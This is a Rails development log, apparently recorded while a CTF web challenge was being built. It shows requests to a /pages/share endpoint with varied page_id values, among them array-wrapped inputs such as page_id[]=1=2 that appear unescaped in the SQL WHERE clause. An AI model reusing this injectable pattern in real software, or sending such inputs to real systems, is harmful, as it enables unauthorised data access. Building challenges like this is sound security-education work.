+Completed 200 OK in 24ms (Views: 13.7ms | ActiveRecord: 2.1ms | Allocations: 11839)
+
+
+Started POST "/pages" for ::1 at 2020-09-24 21:30:05 +0800
+Processing by PagesController#create as HTML
+  Parameters: {"authenticity_token"=>"Th/QGHdck+Llz/6G9Lz4WZ01q15WOFTmbyn7e+E9c5Kg1Eoa2Z8uwke+meFRGiauIgVB6BieHg9U3gUkMG1m0g==", "page"=>{"title"=>"asdsad", "text"=>"sadasd"}, "commit"=>"Save Page"}
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  ↳ app/controllers/pages_controller.rb:10:in `create'
+  [1m[36mPage Create (0.2ms)[0m  [1m[32mINSERT INTO "pages" ("title", "text", "created_at", "updated_at") VALUES (?, ?, ?, ?)[0m  [["title", "asdsad"], ["text", "sadasd"], ["created_at", "2020-09-24 13:30:05.496085"], ["updated_at", "2020-09-24 13:30:05.496085"]]
+  ↳ app/controllers/pages_controller.rb:10:in `create'
+  [1m[35m (145.0ms)[0m  [1m[36mcommit transaction[0m
+  ↳ app/controllers/pages_controller.rb:10:in `create'
+Redirected to http://localhost:3000/
+Completed 302 Found in 154ms (ActiveRecord: 145.3ms | Allocations: 4329)
+
+
+Started GET "/" for ::1 at 2020-09-24 21:30:05 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 8.6ms | Allocations: 1664)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 17ms (Views: 14.2ms | ActiveRecord: 0.2ms | Allocations: 3472)
+
+
+Started GET "/pages/share/1" for ::1 at 2020-09-24 21:30:12 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"id"=>"1"}
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 2.5ms | Allocations: 1317)
+Completed 500 Internal Server Error in 5ms (ActiveRecord: 0.0ms | Allocations: 1889)
+
+
+  
+ActionView::Template::Error (undefined method `title' for nil:NilClass):
+    1: 
+    2: <p>
+    3:   <strong>Title:</strong>
+    4:   <%= @page.title %>
+    5: </p>
+    6:  
+    7: <p>
+  
+app/views/pages/show.html.erb:4
+Started GET "/pages/share/1" for ::1 at 2020-09-24 21:30:55 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#show as HTML
+  Parameters: {"id"=>"1"}
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 12)
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 24ms (Views: 12.2ms | ActiveRecord: 1.9ms | Allocations: 11661)
+
+
+Started GET "/pages/share/?id=1" for ::1 at 2020-09-24 21:31:27 +0800
+  
+ActionController::RoutingError (No route matches [GET] "/pages/share"):
+  
+actionpack (6.0.3.3) lib/action_dispatch/middleware/debug_exceptions.rb:36:in `call'
+web-console (4.0.4) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.0.4) lib/web_console/middleware.rb:28:in `block in call'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.0.3.3) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `block in tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:28:in `tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `tagged'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.2.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/request_id.rb:27:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.0.3.3) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/static.rb:126:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/host_authorization.rb:82:in `call'
+webpacker (4.3.0) lib/webpacker/dev_server_proxy.rb:23:in `perform_request'
+rack-proxy (0.6.5) lib/rack/proxy.rb:57:in `call'
+railties (6.0.3.3) lib/rails/engine.rb:527:in `call'
+puma (4.3.6) lib/puma/configuration.rb:228:in `call'
+puma (4.3.6) lib/puma/server.rb:713:in `handle_request'
+puma (4.3.6) lib/puma/server.rb:472:in `process_client'
+puma (4.3.6) lib/puma/server.rb:328:in `block in run'
+puma (4.3.6) lib/puma/thread_pool.rb:134:in `block in spawn_thread'
+Started GET "/pages/share?page_id=1" for ::1 at 2020-09-24 21:33:33 +0800
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1"}
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 12)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 22ms (Views: 10.4ms | ActiveRecord: 2.2ms | Allocations: 11658)
+
+
+Started GET "/pages/share?page_id=10" for ::1 at 2020-09-24 21:33:39 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"10"}
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 10], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+Completed 404 Not Found in 2ms (ActiveRecord: 0.1ms | Allocations: 1114)
+
+
+  
+ActiveRecord::RecordNotFound (Couldn't find Page with 'id'=10):
+  
+app/controllers/pages_controller.rb:4:in `show'
+Started GET "/pages/share?page_id=1" for ::1 at 2020-09-24 21:34:56 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  
+SyntaxError (/home/rafie/ctf/2020/gemastik/probset/web/myapp/app/controllers/pages_controller.rb:28: syntax error, unexpected end-of-input, expecting keyword_end):
+  
+app/controllers/pages_controller.rb:28: syntax error, unexpected end-of-input, expecting keyword_end
+app/controllers/pages_controller.rb:28: syntax error, unexpected end-of-input, expecting keyword_end
+app/controllers/pages_controller.rb:28: syntax error, unexpected end-of-input, expecting keyword_end
+Started GET "/pages/share?page_id=1" for ::1 at 2020-09-24 21:35:04 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1"}
+  [1m[36mPage Exists? (0.3ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  [1m[36mPage Load (0.4ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.2ms | Allocations: 12)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 32ms (Views: 13.7ms | ActiveRecord: 2.2ms | Allocations: 12730)
+
+
+Started GET "/pages/share?page_id=10" for ::1 at 2020-09-24 21:35:10 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"10"}
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 10], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+Completed 500 Internal Server Error in 8ms (ActiveRecord: 0.2ms | Allocations: 2027)
+
+
+  
+ActionView::MissingTemplate (Missing template pages/not exist, application/not exist with {:locale=>[:en], :formats=>[:html], :variants=>[], :handlers=>[:raw, :erb, :html, :builder, :ruby, :jbuilder]}. Searched in:
+  * "/home/rafie/ctf/2020/gemastik/probset/web/myapp/app/views"
+  * "/var/lib/gems/2.5.0/gems/actiontext-6.0.3.3/app/views"
+  * "/var/lib/gems/2.5.0/gems/actionmailbox-6.0.3.3/app/views"
+):
+  
+app/controllers/pages_controller.rb:7:in `show'
+Started GET "/pages/share?page_id=10" for ::1 at 2020-09-24 21:35:28 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"10"}
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 10], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+Completed 500 Internal Server Error in 7ms (ActiveRecord: 0.8ms | Allocations: 4259)
+
+
+  
+NameError (uninitialized constant PagesController::Nil
+Did you mean?  NIL
+               NIO):
+  
+app/controllers/pages_controller.rb:7:in `show'
+Started GET "/pages/share?page_id=10" for ::1 at 2020-09-24 21:35:38 +0800
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"10"}
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 10], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+Completed 500 Internal Server Error in 246ms (ActiveRecord: 0.9ms | Allocations: 99152)
+
+
+  
+NameError (undefined local variable or method `null' for #<PagesController:0x00007f0834be8690>):
+  
+app/controllers/pages_controller.rb:7:in `show'
+Started GET "/pages/share?page_id=10" for ::1 at 2020-09-24 21:35:57 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"10"}
+  [1m[36mPage Exists? (0.3ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 10], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 1.8ms | Allocations: 1171)
+Completed 500 Internal Server Error in 13ms (ActiveRecord: 1.3ms | Allocations: 3874)
+
+
+  
+ActionView::Template::Error (undefined method `title' for nil:NilClass):
+    1: 
+    2: <p>
+    3:   <strong>Title:</strong>
+    4:   <%= @page.title %>
+    5: </p>
+    6:  
+    7: <p>
+  
+app/views/pages/show.html.erb:4
+Started GET "/pages/share?page_id=10" for ::1 at 2020-09-24 21:37:06 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"10"}
+  [1m[36mPage Exists? (0.5ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 10], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 1.0ms | Allocations: 174)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 38ms (Views: 30.5ms | ActiveRecord: 1.8ms | Allocations: 14021)
+
+
+Started GET "/pages/share?page_id=1=1" for ::1 at 2020-09-24 21:37:54 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1=1"}
+  [1m[36mPage Exists? (0.1ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 12)
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 8ms (Views: 1.4ms | ActiveRecord: 0.3ms | Allocations: 5798)
+
+
+Started GET "/pages/share?page_id=1=2" for ::1 at 2020-09-24 21:37:58 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1=2"}
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 10)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 6ms (Views: 1.9ms | ActiveRecord: 0.5ms | Allocations: 2448)
+
+
+Started GET "/pages/share?page_id=1%2d2" for ::1 at 2020-09-24 21:38:06 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1-2"}
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 10)
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 5ms (Views: 1.6ms | ActiveRecord: 0.4ms | Allocations: 2448)
+
+
+Started GET "/pages/share?page_id=s" for ::1 at 2020-09-24 21:41:50 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"s"}
+  [1m[36mPage Exists? (0.3ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", nil], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 4ms (Views: 1.6ms | ActiveRecord: 0.5ms | Allocations: 1896)
+
+
+Started GET "/pages/share?page_id=1ss" for ::1 at 2020-09-24 21:41:54 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1ss"}
+  [1m[36mPage Exists? (0.3ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 10)
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 6ms (Views: 2.2ms | ActiveRecord: 0.6ms | Allocations: 2450)
+
+
+Started GET "/pages/share?page_id[]=2" for ::1 at 2020-09-24 21:42:03 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["2"]}
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (2) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 2], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 2.1ms | Allocations: 1710)
+Completed 500 Internal Server Error in 6ms (ActiveRecord: 0.3ms | Allocations: 3580)
+
+
+  
+ActionView::Template::Error (undefined method `title' for #<Array:0x00007f0836cd9818>):
+    3: <% if @page %>
+    4: 	<p>
+    5: 	  <strong>Title:</strong>
+    6: 	  <%= @page.title %>
+    7: 	</p>
+    8: 	 
+    9: 	<p>
+  
+app/views/pages/show.html.erb:6
+Started GET "/pages/share?page_id[]=1" for ::1 at 2020-09-24 21:42:13 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1"]}
+  [1m[36mPage Exists? (0.3ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 2.7ms | Allocations: 1706)
+Completed 500 Internal Server Error in 6ms (ActiveRecord: 0.4ms | Allocations: 3560)
+
+
+  
+ActionView::Template::Error (undefined method `title' for #<Array:0x00007f0836823288>):
+    3: <% if @page %>
+    4: 	<p>
+    5: 	  <strong>Title:</strong>
+    6: 	  <%= @page.title %>
+    7: 	</p>
+    8: 	 
+    9: 	<p>
+  
+app/views/pages/show.html.erb:6
+Started GET "/pages/share?page_id[]=1=2" for ::1 at 2020-09-24 21:42:47 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["1=2"]}
+  [1m[36mPage Exists? (0.4ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (1=2) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 5ms (Views: 2.2ms | ActiveRecord: 0.5ms | Allocations: 1870)
+
+
+Started GET "/pages/share?page_id[]=2" for ::1 at 2020-09-24 21:43:33 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["2"]}
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (2) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+Completed 500 Internal Server Error in 7ms (ActiveRecord: 0.5ms | Allocations: 2767)
+
+
+  
+NoMethodError (undefined method `title=' for nil:NilClass):
+  
+app/controllers/pages_controller.rb:5:in `show'
+Started GET "/pages/share?page_id[]=2" for ::1 at 2020-09-24 21:44:13 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["2"]}
+  [1m[36mPage Exists? (0.3ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (2) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 2], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+Completed 500 Internal Server Error in 17ms (ActiveRecord: 1.7ms | Allocations: 7425)
+
+
+  
+NoMethodError (undefined method `title=' for #<Array:0x0000560991e33528>):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=2" for ::1 at 2020-09-24 21:46:53 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["2"]}
+  [1m[36mPage Exists? (0.1ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (2) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 2], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 2.5ms | Allocations: 1660)
+Completed 500 Internal Server Error in 13ms (ActiveRecord: 0.7ms | Allocations: 8339)
+
+
+  
+ActionView::Template::Error (undefined method `title' for #<Array:0x00007f08359a19a8>):
+    3: <% if @page %>
+    4: 	<p>
+    5: 	  <strong>Title:</strong>
+    6: 	  <%= @page.title %>
+    7: 	</p>
+    8: 	 
+    9: 	<p>
+  
+app/views/pages/show.html.erb:6
+Started GET "/pages/share?page_id[]=2" for ::1 at 2020-09-24 21:48:16 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["2"]}
+  [1m[36mPage Exists? (0.4ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (2) LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:4:in `show'
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 2], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:5:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  Rendered pages/show.html.erb within layouts/application (Duration: 26.4ms | Allocations: 13352)
+Completed 500 Internal Server Error in 38ms (ActiveRecord: 1.6ms | Allocations: 15956)
+
+
+  
+ActionView::Template::Error (undefined method `title' for #<Array:0x000056099210f990>):
+    4: 	<% if current_user.id == 1 %>
+    5: 		<p>
+    6: 		  <strong>Title:</strong>
+    7: 		  <%= @page.title %>
+    8: 		</p>
+    9: 		 
+   10: 		<p>
+  
+app/views/pages/show.html.erb:7
+Started GET "/" for ::1 at 2020-09-24 21:49:48 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 3.1ms | Allocations: 1376)
+  [1m[36mUser Load (0.4ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 18ms (Views: 8.3ms | ActiveRecord: 1.2ms | Allocations: 9043)
+
+
+Started GET "/logout" for ::1 at 2020-09-24 21:49:52 +0800
+  
+ActionController::RoutingError (No route matches [GET] "/logout"):
+  
+actionpack (6.0.3.3) lib/action_dispatch/middleware/debug_exceptions.rb:36:in `call'
+web-console (4.0.4) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.0.4) lib/web_console/middleware.rb:28:in `block in call'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.0.3.3) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `block in tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:28:in `tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `tagged'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.2.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/request_id.rb:27:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.0.3.3) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/static.rb:126:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/host_authorization.rb:82:in `call'
+webpacker (4.3.0) lib/webpacker/dev_server_proxy.rb:23:in `perform_request'
+rack-proxy (0.6.5) lib/rack/proxy.rb:57:in `call'
+railties (6.0.3.3) lib/rails/engine.rb:527:in `call'
+puma (4.3.6) lib/puma/configuration.rb:228:in `call'
+puma (4.3.6) lib/puma/server.rb:713:in `handle_request'
+puma (4.3.6) lib/puma/server.rb:472:in `process_client'
+puma (4.3.6) lib/puma/server.rb:328:in `block in run'
+puma (4.3.6) lib/puma/thread_pool.rb:134:in `block in spawn_thread'
+Started GET "/users/new" for ::1 at 2020-09-24 21:50:51 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 4.3ms | Allocations: 1032)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 11ms (Views: 8.0ms | ActiveRecord: 0.2ms | Allocations: 2258)
+
+
+Started GET "/users/new" for ::1 at 2020-09-24 21:50:57 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 4.4ms | Allocations: 1044)
+Completed 200 OK in 8ms (Views: 6.3ms | ActiveRecord: 0.0ms | Allocations: 1608)
+
+
+Started GET "/users/new" for ::1 at 2020-09-24 21:51:00 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
